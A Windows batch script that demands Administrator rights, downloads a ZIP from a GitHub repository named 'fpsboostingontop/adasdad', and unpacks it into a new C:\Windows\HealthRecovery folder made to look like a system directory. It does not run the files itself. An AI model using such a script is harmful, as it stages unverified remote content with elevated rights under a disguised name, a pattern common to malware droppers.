@echo off

:: Check for admin privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as Administrator.
    pause
    exit /b 1
)

:: === CONFIGURATION ===
set "DOWNLOAD_URL=https://raw.githubusercontent.com/fpsboostingontop/adasdad/main/ExecFileD.zip"
set "INSTALL_DIR=C:\Windows\HealthRecovery"
set "ZIP_NAME=ExectFileD.zip"
set "TEMP_EXTRACT=%INSTALL_DIR%\_temp_extract"

:: === CREATE INSTALL DIRECTORY ===
echo Creating install directory...
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    if %errorlevel% neq 0 (
        echo Failed to create "%INSTALL_DIR%". Check permissions.
        pause
        exit /b 1
    )
)

:: Clean up old temp folder if exists
if exist "%TEMP_EXTRACT%" rmdir /s /q "%TEMP_EXTRACT%"

:: === DOWNLOAD FILE ===
echo Downloading %ZIP_NAME% from GitHub...
powershell -NoProfile -Command ^
  "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%INSTALL_DIR%\%ZIP_NAME%' -UseBasicParsing; exit 0 } catch { Write-Error $_; exit 1 }"

if %errorlevel% neq 0 (
    echo Download failed. Check the URL or internet connection.
    pause
    exit /b 1
)

:: === VERIFY DOWNLOAD ===
for %%I in ("%INSTALL_DIR%\%ZIP_NAME%") do set "FILE_SIZE=%%~zI"
if "%FILE_SIZE%"=="0" (
    echo Downloaded file is empty. The link may be incorrect.
    pause
    exit /b 1
)

:: === EXTRACT TO TEMP FOLDER ===
echo Extracting to temp folder...
mkdir "%TEMP_EXTRACT%"
powershell -NoProfile -Command ^
  "try { Expand-Archive -Path '%INSTALL_DIR%\%ZIP_NAME%' -DestinationPath '%TEMP_EXTRACT%' -Force; exit 0 } catch { Write-Error $_; exit 1 }"

if %errorlevel% neq 0 (
    echo Extraction failed. The file may not be a valid ZIP.
    pause
    exit /b 1
)

:: === MOVE FILES FROM TEMP TO FINAL INSTALL DIR ===
echo Moving extracted files to "%INSTALL_DIR%"...
xcopy "%TEMP_EXTRACT%\*" "%INSTALL_DIR%\" /E /H /C /I /Y >nul

:: Cleanup temp folder and ZIP
rmdir /s /q "%TEMP_EXTRACT%"
del /f /q "%INSTALL_DIR%\%ZIP_NAME%"

echo Done. Files are now in: %INSTALL_DIR%
pause
exit /b 0
